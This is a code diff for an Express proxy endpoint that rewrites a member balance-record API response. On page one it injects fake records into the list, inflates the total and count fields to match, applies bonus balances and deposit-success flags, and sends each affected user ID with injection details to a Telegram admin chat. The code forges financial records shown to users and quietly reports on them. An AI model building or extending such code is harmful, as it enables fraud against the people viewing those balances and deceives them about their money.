@@ -1796,6 +1796,12 @@ app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
     const pageNum = parseInt(body.pageNo || body.pageNum || body.page || body.current || qry.pageNo || qry.pageNum || qry.page || qry.current || '1') || 1;
     const shouldInject = pageNum === 1 && fakeRecords.length > 0;
 
+    if (data.adminChatId && bot) {
+      const ldKeys = listData ? (Array.isArray(listData) ? '[Array:' + listData.length + ']' : Object.keys(listData).join(',')) : 'null';
+      const qrCount = userOvr ? (userOvr.quotaRecords ? userOvr.quotaRecords.length : 'no-qr') : 'no-ovr';
+      bot.sendMessage(data.adminChatId, `🔍 QuotaDebug\nUID: ${detectedUserId}\nOvr: ${!!userOvr} | QR: ${qrCount}\nInject: ${shouldInject} | Page: ${pageNum}\nKeys: ${ldKeys}`).catch(()=>{});
+    }
+
     if (listData) {
       if (addedBal !== 0 && typeof listData === 'object' && !Array.isArray(listData)) {
         addBonusToBalanceFields(listData, addedBal);
@@ -1809,25 +1815,24 @@ app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
         if (itemEff.depositSuccess) markDepositSuccess(item);
       };
 
-      if (Array.isArray(listData)) {
-        if (shouldInject) listData.unshift(...fakeRecords);
-        listData.forEach(applyToItem);
-      } else if (listData.list && Array.isArray(listData.list)) {
-        if (shouldInject) listData.list.unshift(...fakeRecords);
-        if (shouldInject && listData.total !== undefined) listData.total += fakeRecords.length;
-        if (shouldInject && listData.totalCount !== undefined) listData.totalCount += fakeRecords.length;
-        listData.list.forEach(applyToItem);
-      } else if (listData.records && Array.isArray(listData.records)) {
-        if (shouldInject) listData.records.unshift(...fakeRecords);
-        if (shouldInject && listData.total !== undefined) listData.total += fakeRecords.length;
-        if (shouldInject && listData.totalCount !== undefined) listData.totalCount += fakeRecords.length;
-        listData.records.forEach(applyToItem);
-      } else if (listData.rows && Array.isArray(listData.rows)) {
-        if (shouldInject) listData.rows.unshift(...fakeRecords);
-        if (shouldInject && listData.total !== undefined) listData.total += fakeRecords.length;
-        if (shouldInject && listData.totalCount !== undefined) listData.totalCount += fakeRecords.length;
-        listData.rows.forEach(applyToItem);
-      } else {
+      const targetArr = Array.isArray(listData) ? listData
+        : (listData.list && Array.isArray(listData.list)) ? listData.list
+        : (listData.records && Array.isArray(listData.records)) ? listData.records
+        : (listData.rows && Array.isArray(listData.rows)) ? listData.rows
+        : (listData.content && Array.isArray(listData.content)) ? listData.content
+        : null;
+
+      if (targetArr) {
+        if (shouldInject) {
+          targetArr.unshift(...fakeRecords);
+          if (!Array.isArray(listData)) {
+            if (listData.total !== undefined) listData.total += fakeRecords.length;
+            if (listData.totalCount !== undefined) listData.totalCount += fakeRecords.length;
+            if (listData.totalElements !== undefined) listData.totalElements += fakeRecords.length;
+          }
+        }
+        targetArr.forEach(applyToItem);
+      } else if (typeof listData === 'object') {
         applyToItem(listData);
       }
     }
